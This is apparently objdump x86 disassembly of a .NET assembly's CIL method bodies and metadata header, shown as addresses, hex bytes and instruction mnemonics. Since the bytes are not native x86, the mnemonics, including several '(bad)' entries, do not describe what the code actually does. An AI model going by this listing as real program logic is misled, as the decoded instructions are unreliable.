  40574b:	08 6f ee             	or     %ch,-0x12(%edi)
  40574e:	00 00                	add    %al,(%eax)
  405750:	0a 07                	or     (%edi),%al
  405752:	28 4a 00             	sub    %cl,0x0(%edx)
  405755:	00 0a                	add    %cl,(%edx)
  405757:	28 58 00             	sub    %bl,0x0(%eax)
  40575a:	00 06                	add    %al,(%esi)
  40575c:	0a 02                	or     (%edx),%al
  40575e:	06                   	push   %es
  40575f:	16                   	push   %ss
  405760:	06                   	push   %es
  405761:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405764:	4c                   	dec    %esp
  405765:	00 00                	add    %al,(%eax)
  405767:	0a 02                	or     (%edx),%al
  405769:	03 16                	add    (%esi),%edx
  40576b:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405771:	00 0a                	add    %cl,(%edx)
  405773:	2a 13                	sub    (%ebx),%dl
  405775:	30 04 00             	xor    %al,(%eax,%eax,1)
  405778:	21 00                	and    %eax,(%eax)
  40577a:	00 00                	add    %al,(%eax)
  40577c:	29 00                	sub    %eax,(%eax)
  40577e:	00 11                	add    %dl,(%ecx)
  405780:	02 20                	add    (%eax),%ah
  405782:	cf                   	iret
  405783:	00 00                	add    %al,(%eax)
  405785:	00 6f ee             	add    %ch,-0x12(%edi)
  405788:	00 00                	add    %al,(%eax)
  40578a:	0a 03                	or     (%ebx),%al
  40578c:	28 09                	sub    %cl,(%ecx)
  40578e:	01 00                	add    %eax,(%eax)
  405790:	0a 0a                	or     (%edx),%cl
  405792:	02 06                	add    (%esi),%al
  405794:	28 58 00             	sub    %bl,0x0(%eax)
  405797:	00 06                	add    %al,(%esi)
  405799:	16                   	push   %ss
  40579a:	1e                   	push   %ds
  40579b:	6f                   	outsl  %ds:(%esi),(%dx)
  40579c:	4c                   	dec    %esp
  40579d:	00 00                	add    %al,(%eax)
  40579f:	0a 2a                	or     (%edx),%ch
  4057a1:	00 00                	add    %al,(%eax)
  4057a3:	00 13                	add    %dl,(%ebx)
  4057a5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a8:	35 01 00 00 00       	xor    $0x1,%eax
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	16                   	push   %ss
  4057b2:	6a 3f                	push   $0x3f
  4057b4:	96                   	xchg   %eax,%esi
  4057b5:	00 00                	add    %al,(%eax)
  4057b7:	00 03                	add    %al,(%ebx)
  4057b9:	1f                   	pop    %ds
  4057ba:	7f 6a                	jg     0x405826
  4057bc:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057c1:	02 03                	add    (%ebx),%al
  4057c3:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	0a 2a                	or     (%edx),%ch
  4057ca:	03 20                	add    (%eax),%esp
  4057cc:	ff 00                	incl   (%eax)
  4057ce:	00 00                	add    %al,(%eax)
  4057d0:	6a 3d                	push   $0x3d
  4057d2:	14 00                	adc    $0x0,%al
  4057d4:	00 00                	add    %al,(%eax)
  4057d6:	02 20                	add    (%eax),%ah
  4057d8:	cc                   	int3
  4057d9:	00 00                	add    %al,(%eax)
  4057db:	00 6f ee             	add    %ch,-0x12(%edi)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 02                	or     (%edx),%al
  4057e2:	03 d2                	add    %edx,%edx
  4057e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057e5:	ee                   	out    %al,(%dx)
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	0a 2a                	or     (%edx),%ch
  4057ea:	03 20                	add    (%eax),%esp
  4057ec:	ff                   	(bad)
  4057ed:	ff 00                	incl   (%eax)
  4057ef:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057f2:	1b 00                	sbb    (%eax),%eax
  4057f4:	00 00                	add    %al,(%eax)
  4057f6:	02 20                	add    (%eax),%ah
  4057f8:	cd 00                	int    $0x0
  4057fa:	00 00                	add    %al,(%eax)
  4057fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057fd:	ee                   	out    %al,(%dx)
  4057fe:	00 00                	add    %al,(%eax)
  405800:	0a 02                	or     (%edx),%al
  405802:	03 68 28             	add    0x28(%eax),%ebp
  405805:	5b                   	pop    %ebx
  405806:	00 00                	add    %al,(%eax)
  405808:	06                   	push   %es
  405809:	16                   	push   %ss
  40580a:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  40580d:	00 00                	add    %al,(%eax)
  40580f:	0a 2a                	or     (%edx),%ch
  405811:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  405817:	00 00                	add    %al,(%eax)
  405819:	02 20                	add    (%eax),%ah
  40581b:	ce                   	into
  40581c:	00 00                	add    %al,(%eax)
  40581e:	00 6f ee             	add    %ch,-0x12(%edi)
  405821:	00 00                	add    %al,(%eax)
  405823:	0a 02                	or     (%edx),%al
  405825:	03 69 28             	add    0x28(%ecx),%ebp
  405828:	5a                   	pop    %edx
  405829:	00 00                	add    %al,(%eax)
  40582b:	06                   	push   %es
  40582c:	16                   	push   %ss
  40582d:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405830:	00 00                	add    %al,(%eax)
  405832:	0a 2a                	or     (%edx),%ch
  405834:	02 20                	add    (%eax),%ah
  405836:	d3 00                	roll   %cl,(%eax)
  405838:	00 00                	add    %al,(%eax)
  40583a:	6f                   	outsl  %ds:(%esi),(%dx)
  40583b:	ee                   	out    %al,(%dx)
  40583c:	00 00                	add    %al,(%eax)
  40583e:	0a 02                	or     (%edx),%al
  405840:	03 28                	add    (%eax),%ebp
  405842:	59                   	pop    %ecx
  405843:	00 00                	add    %al,(%eax)
  405845:	06                   	push   %es
  405846:	16                   	push   %ss
  405847:	1e                   	push   %ds
  405848:	6f                   	outsl  %ds:(%esi),(%dx)
  405849:	4c                   	dec    %esp
  40584a:	00 00                	add    %al,(%eax)
  40584c:	0a 2a                	or     (%edx),%ch
  40584e:	03 20                	add    (%eax),%esp
  405850:	00 00                	add    %al,(%eax)
  405852:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405858:	00 00                	add    %al,(%eax)
  40585a:	02 20                	add    (%eax),%ah
  40585c:	d3 00                	roll   %cl,(%eax)
  40585e:	00 00                	add    %al,(%eax)
  405860:	6f                   	outsl  %ds:(%esi),(%dx)
  405861:	ee                   	out    %al,(%dx)
  405862:	00 00                	add    %al,(%eax)
  405864:	0a 02                	or     (%edx),%al
  405866:	03 28                	add    (%eax),%ebp
  405868:	59                   	pop    %ecx
  405869:	00 00                	add    %al,(%eax)
  40586b:	06                   	push   %es
  40586c:	16                   	push   %ss
  40586d:	1e                   	push   %ds
  40586e:	6f                   	outsl  %ds:(%esi),(%dx)
  40586f:	4c                   	dec    %esp
  405870:	00 00                	add    %al,(%eax)
  405872:	0a 2a                	or     (%edx),%ch
  405874:	03 20                	add    (%eax),%esp
  405876:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  40587c:	1b 00                	sbb    (%eax),%eax
  40587e:	00 00                	add    %al,(%eax)
  405880:	02 20                	add    (%eax),%ah
  405882:	d2 00                	rolb   %cl,(%eax)
  405884:	00 00                	add    %al,(%eax)
  405886:	6f                   	outsl  %ds:(%esi),(%dx)
  405887:	ee                   	out    %al,(%dx)
  405888:	00 00                	add    %al,(%eax)
  40588a:	0a 02                	or     (%edx),%al
  40588c:	03 69 28             	add    0x28(%ecx),%ebp
  40588f:	5a                   	pop    %edx
  405890:	00 00                	add    %al,(%eax)
  405892:	06                   	push   %es
  405893:	16                   	push   %ss
  405894:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405897:	00 00                	add    %al,(%eax)
  405899:	0a 2a                	or     (%edx),%ch
  40589b:	03 1f                	add    (%edi),%ebx
  40589d:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  4058a1:	00 00                	add    %al,(%eax)
  4058a3:	00 02                	add    %al,(%edx)
  4058a5:	20 d1                	and    %dl,%cl
  4058a7:	00 00                	add    %al,(%eax)
  4058a9:	00 6f ee             	add    %ch,-0x12(%edi)
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	0a 02                	or     (%edx),%al
  4058b0:	03 68 28             	add    0x28(%eax),%ebp
  4058b3:	5b                   	pop    %ebx
  4058b4:	00 00                	add    %al,(%eax)
  4058b6:	06                   	push   %es
  4058b7:	16                   	push   %ss
  4058b8:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058bb:	00 00                	add    %al,(%eax)
  4058bd:	0a 2a                	or     (%edx),%ch
  4058bf:	03 1f                	add    (%edi),%ebx
  4058c1:	e0 6a                	loopne 0x40592d
  4058c3:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c8:	02 20                	add    (%eax),%ah
  4058ca:	d0 00                	rolb   $1,(%eax)
  4058cc:	00 00                	add    %al,(%eax)
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 02                	or     (%edx),%al
  4058d4:	03 d2                	add    %edx,%edx
  4058d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058d7:	ee                   	out    %al,(%dx)
  4058d8:	00 00                	add    %al,(%eax)
  4058da:	0a 2a                	or     (%edx),%ch
  4058dc:	02 03                	add    (%ebx),%al
  4058de:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058e1:	00 00                	add    %al,(%eax)
  4058e3:	0a 2a                	or     (%edx),%ch
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 1b                	add    %bl,(%ebx)
  4058e9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058ec:	61                   	popa
  4058ed:	00 00                	add    %al,(%eax)
  4058ef:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058f5:	73 4d                	jae    0x405944
  4058f7:	00 00                	add    %al,(%eax)
  4058f9:	0a 0a                	or     (%edx),%cl
  4058fb:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  405901:	0b 06                	or     (%esi),%eax
  405903:	07                   	pop    %es
  405904:	16                   	push   %ss
  405905:	1a 6f 45             	sbb    0x45(%edi),%ch
  405908:	00 00                	add    %al,(%eax)
  40590a:	0a 26                	or     (%esi),%ah
  40590c:	07                   	pop    %es
  40590d:	16                   	push   %ss
  40590e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405912:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405915:	16                   	push   %ss
  405916:	73 0a                	jae    0x405922
  405918:	01 00                	add    %eax,(%eax)
  40591a:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405920:	00 01                	add    %al,(%ecx)
  405922:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  405925:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405928:	08 6f 45             	or     %ch,0x45(%edi)
  40592b:	00 00                	add    %al,(%eax)
  40592d:	0a 26                	or     (%esi),%ah
  40592f:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  405932:	05 dd 1a 00 00       	add    $0x1add,%eax
  405937:	00 09                	add    %cl,(%ecx)
  405939:	39 06                	cmp    %eax,(%esi)
  40593b:	00 00                	add    %al,(%eax)
  40593d:	00 09                	add    %cl,(%ecx)
  40593f:	6f                   	outsl  %ds:(%esi),(%dx)
  405940:	33 00                	xor    (%eax),%eax
  405942:	00 0a                	add    %cl,(%edx)
  405944:	dc 06                	faddl  (%esi)
  405946:	39 06                	cmp    %eax,(%esi)
  405948:	00 00                	add    %al,(%eax)
  40594a:	00 06                	add    %al,(%esi)
  40594c:	6f                   	outsl  %ds:(%esi),(%dx)
  40594d:	33 00                	xor    (%eax),%eax
  40594f:	00 0a                	add    %cl,(%edx)
  405951:	dc 11                	fcoml  (%ecx)
  405953:	05 2a 00 00 00       	add    $0x2a,%eax
  405958:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40595b:	00 02                	add    %al,(%edx)
  40595d:	00 28                	add    %ch,(%eax)
  40595f:	00 1c 44             	add    %bl,(%esp,%eax,2)
  405962:	00 0d 00 00 00 00    	add    %cl,0x0
  405968:	02 00                	add    (%eax),%al
  40596a:	07                   	pop    %es
  40596b:	00 4a 51             	add    %cl,0x51(%edx)
  40596e:	00 0d 00 00 00 00    	add    %cl,0x0
  405974:	1b 30                	sbb    (%eax),%esi
  405976:	04 00                	add    $0x0,%al
  405978:	5e                   	pop    %esi
  405979:	00 00                	add    %al,(%eax)
  40597b:	00 2e                	add    %ch,(%esi)
  40597d:	00 00                	add    %al,(%eax)
  40597f:	11 73 d0             	adc    %esi,-0x30(%ebx)
  405982:	00 00                	add    %al,(%eax)
  405984:	0a 0a                	or     (%edx),%cl
  405986:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  40598c:	00 0a                	add    %cl,(%edx)
  40598e:	0b 06                	or     (%esi),%eax
  405990:	07                   	pop    %es
  405991:	16                   	push   %ss
  405992:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405995:	00 00                	add    %al,(%eax)
  405997:	0a 06                	or     (%esi),%al
  405999:	17                   	pop    %ss
  40599a:	73 0a                	jae    0x4059a6
  40599c:	01 00                	add    %eax,(%eax)
  40599e:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4059a1:	02 16                	add    (%esi),%dl
  4059a3:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a9:	00 0a                	add    %cl,(%edx)
  4059ab:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059ae:	00 00                	add    %al,(%eax)
  4059b0:	0a dd                	or     %ch,%bl
  4059b2:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059b7:	39 06                	cmp    %eax,(%esi)
  4059b9:	00 00                	add    %al,(%eax)
  4059bb:	00 08                	add    %cl,(%eax)
  4059bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4059be:	33 00                	xor    (%eax),%eax
  4059c0:	00 0a                	add    %cl,(%edx)
  4059c2:	dc 06                	faddl  (%esi)
  4059c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4059c5:	dd 00                	fldl   (%eax)
  4059c7:	00 0a                	add    %cl,(%edx)
  4059c9:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059ce:	00 06                	add    %al,(%esi)
  4059d0:	39 06                	cmp    %eax,(%esi)
  4059d2:	00 00                	add    %al,(%eax)
  4059d4:	00 06                	add    %al,(%esi)
  4059d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4059d7:	33 00                	xor    (%eax),%eax
  4059d9:	00 0a                	add    %cl,(%edx)
  4059db:	dc 09                	fmull  (%ecx)
  4059dd:	2a 00                	sub    (%eax),%al
  4059df:	00 01                	add    %al,(%ecx)
  4059e1:	1c 00                	sbb    $0x0,%al
  4059e3:	00 02                	add    %al,(%edx)
  4059e5:	00 20                	add    %ah,(%eax)
  4059e7:	00 16                	add    %dl,(%esi)
  4059e9:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059f0:	02 00                	add    (%eax),%al
  4059f2:	06                   	push   %es
  4059f3:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059f6:	00 0d 00 00 00 00    	add    %cl,0x0
  4059fc:	42                   	inc    %edx
  4059fd:	53                   	push   %ebx
  4059fe:	4a                   	dec    %edx
  4059ff:	42                   	inc    %edx
  405a00:	01 00                	add    %eax,(%eax)
  405a02:	01 00                	add    %eax,(%eax)
  405a04:	00 00                	add    %al,(%eax)
  405a06:	00 00                	add    %al,(%eax)
  405a08:	0c 00                	or     $0x0,%al
  405a0a:	00 00                	add    %al,(%eax)
  405a0c:	76 34                	jbe    0x405a42
  405a0e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a11:	33 30                	xor    (%eax),%esi
  405a13:	33 31                	xor    (%ecx),%esi
  405a15:	39 00                	cmp    %eax,(%eax)
  405a17:	00 00                	add    %al,(%eax)
  405a19:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a1f:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a26:	00 00                	add    %al,(%eax)
  405a28:	28 1e                	sub    %bl,(%esi)
  405a2a:	00 00                	add    %al,(%eax)
  405a2c:	b4 1d                	mov    $0x1d,%ah
  405a2e:	00 00                	add    %al,(%eax)
  405a30:	23 53 74             	and    0x74(%ebx),%edx
  405a33:	72 69                	jb     0x405a9e
  405a35:	6e                   	outsb  %ds:(%esi),(%dx)
  405a36:	67 73 00             	addr16 jae 0x405a39
  405a39:	00 00                	add    %al,(%eax)
  405a3b:	00 dc                	add    %bl,%ah
  405a3d:	3b 00                	cmp    (%eax),%eax
  405a3f:	00 c8                	add    %cl,%al
  405a41:	27                   	daa
  405a42:	00 00                	add    %al,(%eax)
  405a44:	23 55 53             	and    0x53(%ebp),%edx
  405a47:	00 a4 63 00 00 10 00 	add    %ah,0x100000(%ebx,%eiz,2)
  405a4e:	00 00                	add    %al,(%eax)
  405a50:	23 47 55             	and    0x55(%edi),%eax
  405a53:	49                   	dec    %ecx
  405a54:	44                   	inc    %esp
  405a55:	00 00                	add    %al,(%eax)
  405a57:	00 b4 63 00 00 40 09 	add    %dh,0x9400000(%ebx,%eiz,2)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	23 42 6c             	and    0x6c(%edx),%eax
  405a63:	6f                   	outsl  %ds:(%esi),(%dx)
  405a64:	62 00                	bound  %eax,(%eax)
  405a66:	00 00                	add    %al,(%eax)
  405a68:	00 00                	add    %al,(%eax)
  405a6a:	00 00                	add    %al,(%eax)
  405a6c:	02 00                	add    (%eax),%al
  405a6e:	00 01                	add    %al,(%ecx)
  405a70:	57                   	push   %edi
  405a71:	9f                   	lahf
  405a72:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a77:	00 00                	add    %al,(%eax)
  405a79:	fa                   	cli
  405a7a:	25 33 00 16 00       	and    $0x160033,%eax
  405a7f:	00 01                	add    %al,(%ecx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a89:	00 00                	add    %al,(%eax)
  405a8b:	00 47 00             	add    %al,0x0(%edi)
  405a8e:	00 00                	add    %al,(%eax)
  405a90:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a95:	00 00                	add    %al,(%eax)
  405a97:	00 02                	add    %al,(%edx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 0a                	add    %cl,(%edx)
  405a9d:	01 00                	add    %eax,(%eax)
  405a9f:	00 13                	add    %dl,(%ebx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 31                	add    %dh,(%ecx)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 02                	add    %al,(%edx)
  405aa9:	00 00                	add    %al,(%eax)
  405aab:	00 2e                	add    %ch,(%esi)
  405aad:	00 00                	add    %al,(%eax)
  405aaf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	13 00                	adc    (%eax),%eax
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	20 00                	and    %al,(%eax)
  405aba:	00 00                	add    %al,(%eax)
  405abc:	04 00                	add    $0x0,%al
  405abe:	00 00                	add    %al,(%eax)
  405ac0:	03 00                	add    (%eax),%eax
  405ac2:	00 00                	add    %al,(%eax)
  405ac4:	06                   	push   %es
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 06                	add    %al,(%esi)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 02                	add    %al,(%edx)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 01                	add    %al,(%ecx)
  405ad1:	00 00                	add    %al,(%eax)
  405ad3:	00 08                	add    %cl,(%eax)
  405ad5:	00 00                	add    %al,(%eax)
  405ad7:	00 04 00             	add    %al,(%eax,%eax,1)
  405ada:	00 00                	add    %al,(%eax)
  405adc:	01 00                	add    %eax,(%eax)
  405ade:	00 00                	add    %al,(%eax)
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	ea 0a 01 00 00 00 00 	ljmp   $0x0,$0x10a
  405ae9:	00 06                	add    %al,(%esi)
  405aeb:	00 31                	add    %dh,(%ecx)
  405aed:	19 e6                	sbb    %esp,%esi
  405aef:	0f 0a                	(bad)
  405af1:	00 8a 00 fb 15 0a    	add    %cl,0xa15fb00(%edx)
  405af7:	00 97 19 6a 18 0a    	add    %dl,0xa186a19(%edi)
  405afd:	00 81 0f 81 1d 06    	add    %al,0x61d810f(%ecx)
  405b03:	00 21                	add    %ah,(%ecx)
  405b05:	14 90                	adc    $0x90,%al
  405b07:	0b 06                	or     (%esi),%eax
  405b09:	00 7d 08             	add    %bh,0x8(%ebp)
  405b0c:	fb                   	sti
  405b0d:	15 0a 00 9a 10       	adc    $0x109a000a,%eax
  405b12:	fb                   	sti
  405b13:	15 0a 00 06 18       	adc    $0x1806000a,%eax
  405b18:	81 1d 06 00 f1 19 e6 	sbbl   $0xe0fe6,0x19f10006
  405b1f:	0f 0e 00 
  405b22:	fd                   	std
  405b23:	11 e7                	adc    %esp,%edi
  405b25:	0b 0e                	or     (%esi),%ecx
  405b27:	00 bc 18 e7 0b 06 00 	add    %bh,0x60be7(%eax,%ebx,1)
  405b2e:	3a 1c 90             	cmp    (%eax,%edx,4),%bl
  405b31:	0b 06                	or     (%esi),%eax
  405b33:	00 21                	add    %ah,(%ecx)
  405b35:	13 d7                	adc    %edi,%edx
  405b37:	1b 06                	sbb    (%esi),%eax
  405b39:	00 57 10             	add    %dl,0x10(%edi)
  405b3c:	e6 0f                	out    %al,$0xf
  405b3e:	0a 00                	or     (%eax),%al
  405b40:	12 17                	adc    (%edi),%dl
  405b42:	55                   	push   %ebp
  405b43:	00 06                	add    %al,(%esi)
  405b45:	00 2b                	add    %ch,(%ebx)
  405b47:	00 c1                	add    %al,%cl
  405b49:	02 12                	add    (%edx),%dl
  405b4b:	00 20                	add    %ah,(%eax)
  405b4d:	00 93 15 12 00 01    	add    %dl,0x1001215(%ebx)
  405b53:	00 e6                	add    %ah,%dh
  405b55:	0f 12 00             	movlps (%eax),%xmm0
  405b58:	d9 08                	(bad) (%eax)
  405b5a:	93                   	xchg   %eax,%ebx
  405b5b:	15 06 00 f8 07       	adc    $0x7f80006,%eax
  405b60:	e6 0f                	out    %al,$0xf
  405b62:	06                   	push   %es
  405b63:	00 da                	add    %bl,%dl
  405b65:	0b d7                	or     %edi,%edx
  405b67:	1b 06                	sbb    (%esi),%eax
  405b69:	00 9b 14 c0 17 06    	add    %bl,0x617c014(%ebx)
  405b6f:	00 9c 05 c0 17 06 00 	add    %bl,0x617c0(%ebp,%eax,1)
  405b76:	ba 0f 5c 02 06       	mov    $0x6025c0f,%edx
  405b7b:	00 e6                	add    %ah,%dh
  405b7d:	09 93 15 06 00 53    	or     %edx,0x53000615(%ebx)
  405b83:	0a 93 15 06 00 03    	or     0x3000615(%ebx),%dl
  405b89:	09 35 15 6f 00 b3    	or     %esi,0xb3006f15
  405b8f:	15 00 00 06 00       	adc    $0x60000,%eax
  405b94:	2b 09                	sub    (%ecx),%ecx
  405b96:	47                   	inc    %edi
  405b97:	11 06                	adc    %eax,(%esi)
  405b99:	00 b2 09 47 11 06    	add    %dh,0x6114709(%edx)
  405b9f:	00 93 09 47 11 06    	add    %dl,0x6114709(%ebx)
  405ba5:	00 3a                	add    %bh,(%edx)
  405ba7:	0a 47 11             	or     0x11(%edi),%al
  405baa:	06                   	push   %es
  405bab:	00 06                	add    %al,(%esi)
  405bad:	0a 47 11             	or     0x11(%edi),%al
  405bb0:	06                   	push   %es
  405bb1:	00 1f                	add    %bl,(%edi)
  405bb3:	0a 47 11             	or     0x11(%edi),%al
  405bb6:	06                   	push   %es
  405bb7:	00 42 09             	add    %al,0x9(%edx)
  405bba:	47                   	inc    %edi
  405bbb:	11 06                	adc    %eax,(%esi)
  405bbd:	00 76 09             	add    %dh,0x9(%esi)
  405bc0:	47                   	inc    %edi
  405bc1:	11 06                	adc    %eax,(%esi)
  405bc3:	00 5d 09             	add    %bl,0x9(%ebp)
  405bc6:	fe 0b                	decb   (%ebx)
  405bc8:	06                   	push   %es
  405bc9:	00 17                	add    %dl,(%edi)
  405bcb:	09 74 15 06          	or     %esi,0x6(%ebp,%edx,1)
  405bcf:	00 e8                	add    %ch,%al
  405bd1:	08 93 15 06 00 cf    	or     %dl,-0x30fff9eb(%ebx)
  405bd7:	09 47 11             	or     %eax,0x11(%edi)
  405bda:	06                   	push   %es
  405bdb:	00 11                	add    %dl,(%ecx)
  405bdd:	03 90 0b 06 00 91    	add    -0x6efff9f5(%eax),%edx
  405be3:	1b e6                	sbb    %esi,%esp
  405be5:	0f 06                	clts
  405be7:	00 89 1a e6 0f 06    	add    %cl,0x60fe61a(%ecx)
  405bed:	00 de                	add    %bl,%dh
  405bef:	0b d7                	or     %edi,%edx
  405bf1:	1b 0a                	sbb    (%edx),%ecx
  405bf3:	00 c6                	add    %al,%dh
  405bf5:	1c fb                	sbb    $0xfb,%al
  405bf7:	15 06 00 11 10       	adc    $0x10110006,%eax
  405bfc:	f4                   	hlt
  405bfd:	1c 06                	sbb    $0x6,%al
  405bff:	00 ef                	add    %ch,%bh
  405c01:	12 f4                	adc    %ah,%dh
  405c03:	1c 06                	sbb    $0x6,%al
  405c05:	00 71 0b             	add    %dh,0xb(%ecx)
  405c08:	f4                   	hlt
  405c09:	1c 06                	sbb    $0x6,%al
  405c0b:	00 eb                	add    %ch,%bl
  405c0d:	11 e6                	adc    %esp,%esi
  405c0f:	0f 0a                	(bad)
  405c11:	00 4c 18 56          	add    %cl,0x56(%eax,%ebx,1)
  405c15:	19 0a                	sbb    %ecx,(%edx)
  405c17:	00 0f                	add    %cl,(%edi)
  405c19:	1a 56 19             	sbb    0x19(%esi),%dl
  405c1c:	0a 00                	or     (%eax),%al
  405c1e:	9e                   	sahf
  405c1f:	0e                   	push   %cs
  405c20:	56                   	push   %esi
  405c21:	19 0a                	sbb    %ecx,(%edx)
  405c23:	00 1a                	add    %bl,(%edx)
  405c25:	1d 6a 18 0a 00       	sbb    $0xa186a,%eax
  405c2a:	2d 08 6a 18 0a       	sub    $0xa186a08,%eax
  405c2f:	00 18                	add    %bl,(%eax)
  405c31:	08 6a 18             	or     %ch,0x18(%edx)
  405c34:	06                   	push   %es
  405c35:	00 bb 0c e6 0f 06    	add    %bh,0x60fe60c(%ebx)
  405c3b:	00 c4                	add    %al,%ah
  405c3d:	12 e6                	adc    %dh,%ah
  405c3f:	0f 06                	clts
  405c41:	00 38                	add    %bh,(%eax)
  405c43:	10 e6                	adc    %ah,%dh
  405c45:	0f 0a                	(bad)
  405c47:	00 b3 17 56 19 0a    	add    %dh,0xa195617(%ebx)
  405c4d:	00 4d 17             	add    %cl,0x17(%ebp)
  405c50:	56                   	push   %esi
  405c51:	19 06                	sbb    %eax,(%esi)
  405c53:	00 d3                	add    %dl,%bl
  405c55:	17                   	pop    %ss
  405c56:	e6 0f                	out    %al,$0xf
  405c58:	06                   	push   %es
  405c59:	00 a8 05 e6 0f 0a    	add    %ch,0xa0fe605(%eax)
  405c5f:	00 73 0f             	add    %dh,0xf(%ebx)
  405c62:	6a 18                	push   $0x18
  405c64:	0a 00                	or     (%eax),%al
  405c66:	e8 0d 81 1d 0a       	call   0xa5ddd78
  405c6b:	00 30                	add    %dh,(%eax)
  405c6d:	1b 56 19             	sbb    0x19(%esi),%edx
  405c70:	0a 00                	or     (%eax),%al
  405c72:	59                   	pop    %ecx
  405c73:	11 fb                	adc    %edi,%ebx
  405c75:	15 0a 00 71 17       	adc    $0x1771000a,%eax
  405c7a:	28 11                	sub    %dl,(%ecx)
  405c7c:	06                   	push   %es
  405c7d:	00 93 0a e6 0f 06    	add    %dl,0x60fe60a(%ebx)
  405c83:	00 0c 0e             	add    %cl,(%esi,%ecx,1)
  405c86:	90                   	nop
  405c87:	0b 06                	or     (%esi),%eax
  405c89:	00 da                	add    %bl,%dl
  405c8b:	0d e6 0f 0a 00       	or     $0xa0fe6,%eax
  405c90:	97                   	xchg   %eax,%edi
  405c91:	0d e6 0f 0a 00       	or     $0xa0fe6,%eax
  405c96:	e4 07                	in     $0x7,%al
  405c98:	e6 0f                	out    %al,$0xf
  405c9a:	06                   	push   %es
  405c9b:	00 80 14 e6 0f 06    	add    %al,0x60fe614(%eax)
  405ca1:	00 78 1b             	add    %bh,0x1b(%eax)
  405ca4:	90                   	nop
  405ca5:	0b 06                	or     (%esi),%eax
  405ca7:	00 b4 0f 5c 02 06 00 	add    %dh,0x6025c(%edi,%ecx,1)
  405cae:	06                   	push   %es
  405caf:	15 90 0b 0a 00       	adc    $0xa0b90,%eax
  405cb4:	52                   	push   %edx
  405cb5:	05 6a 18 06 00       	add    $0x6186a,%eax
  405cba:	b8 01 e6 0f 06       	mov    $0x60fe601,%eax
  405cbf:	00 15 12 5c 02 0a    	add    %dl,0xa025c12
  405cc5:	00 44 18 35          	add    %al,0x35(%eax,%ebx,1)
  405cc9:	15 0a 00 57 12       	adc    $0x1257000a,%eax
  405cce:	35 15 06 00 e3       	xor    $0xe3000615,%eax
  405cd3:	1c 55                	sbb    $0x55,%al
  405cd5:	00 06                	add    %al,(%esi)
  405cd7:	00 62 14             	add    %ah,0x14(%edx)
  405cda:	5c                   	pop    %esp
  405cdb:	02 06                	add    (%esi),%al
  405cdd:	00 5a 0d             	add    %bl,0xd(%edx)
  405ce0:	5c                   	pop    %esp
  405ce1:	02 0a                	add    (%edx),%cl
  405ce3:	00 b1 06 35 15 06    	add    %dh,0x6153506(%ecx)
  405ce9:	00 28                	add    %ch,(%eax)
  405ceb:	12 5c 02 0a          	adc    0xa(%edx,%eax,1),%bl
